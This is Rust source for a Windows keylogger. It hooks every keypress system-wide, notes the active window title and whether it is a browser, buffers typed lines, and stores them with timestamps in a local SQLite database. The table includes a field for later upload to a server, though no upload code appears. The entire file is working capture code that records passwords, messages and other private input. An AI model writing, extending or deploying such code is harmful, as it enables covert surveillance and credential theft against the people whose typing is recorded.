use rdev::{listen, Event, EventType, Key};
use rusqlite::{params, Connection};
use std::sync::{Arc, Mutex};
use std::time::SystemTime;
use log::info;
use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW};

// Database constants
const DATABASE_PATH: &str = "keylogger.db";

// Shared state for active window and line buffer
lazy_static::lazy_static! {
    static ref ACTIVE_WINDOW: Mutex<String> = Mutex::new(String::new());
    static ref LINE_BUFFER: Mutex<String> = Mutex::new(String::new());
}

/// Fetch the active window title
fn get_active_window_title() -> String {
    let hwnd = unsafe { GetForegroundWindow() };
    if hwnd.is_null() {
        return "Unknown".to_string();
    }

    let mut buffer = [0u16; 512];
    let len = unsafe { GetWindowTextW(hwnd, buffer.as_mut_ptr(), buffer.len() as i32) };

    if len > 0 {
        String::from_utf16_lossy(&buffer[..len as usize])
    } else {
        "Unknown".to_string()
    }
}

/// Initialize SQLite database
fn init_db() -> Connection {
    let conn = Connection::open(DATABASE_PATH).expect("Failed to open SQLite database");
    conn.execute(
        "CREATE TABLE IF NOT EXISTS key_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            window_title TEXT,
            is_browser BOOLEAN,
            url TEXT,
            keys TEXT,
            datetime TEXT,
            is_uploaded_to_server BOOLEAN DEFAULT 0
        )",
        [],
    )
        .expect("Failed to create table in SQLite database");
    conn
}

/// Map `Key` to its string representation
fn map_key_to_string(key: &Key) -> String {
    match key {
        Key::Space => " ".to_string(),
        Key::Return => "\n".to_string(),
        Key::Backspace => "[BACKSPACE]".to_string(),
        Key::Tab => "\t".to_string(),
        _ => format!("{:?}", key).trim_start_matches("Key").to_string(),
    }
}

/// Check if the active window is a browser
fn is_browser_window(window_title: &str) -> bool {
    window_title.to_lowercase().contains("chrome")
        || window_title.to_lowercase().contains("firefox")
        || window_title.to_lowercase().contains("edge")
        || window_title.to_lowercase().contains("opera")
}

/// Simulate fetching the browser URL (you may implement a proper method later)
fn get_browser_url() -> String {
    "https://example.com".to_string() // Placeholder
}

/// Log key data into the SQLite database
fn log_to_db(window_title: &str, is_browser: bool, url: Option<String>, keys: &str) {
    let conn = init_db();
    let datetime = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .expect("System time before UNIX epoch")
        .as_secs()
        .to_string();
    conn.execute(
        "INSERT INTO key_logs (window_title, is_browser, url, keys, datetime) VALUES (?1, ?2, ?3, ?4, ?5)",
        params![window_title, is_browser, url.unwrap_or_default(), keys, datetime],
    )
        .expect("Failed to insert data into SQLite database");
}

/// Handle a key event
fn handle_event(event: Event) {
    match event.event_type {
        EventType::KeyPress(key) => {
            let key_str = map_key_to_string(&key);

            // Update active window title
            let current_window_title = get_active_window_title();
            {
                let mut active_window = ACTIVE_WINDOW.lock().unwrap();
                *active_window = current_window_title.clone();
            }

            if key_str == "\n" {
                let mut buffer = LINE_BUFFER.lock().unwrap();
                let line = buffer.clone();
                buffer.clear();

                let is_browser = is_browser_window(&current_window_title);
                let url = if is_browser {
                    Some(get_browser_url())
                } else {
                    None
                };

                log_to_db(&current_window_title, is_browser, url, &line);
            } else {
                let mut buffer = LINE_BUFFER.lock().unwrap();
                buffer.push_str(&key_str);
            }
        }
        _ => {}
    }
}

/// Start keylogger
pub fn start_keylogging() {
    info!("Starting keylogger...");
    if let Err(error) = listen(move |event| handle_event(event)) {
        eprintln!("Error: {:?}", error);
    }
}
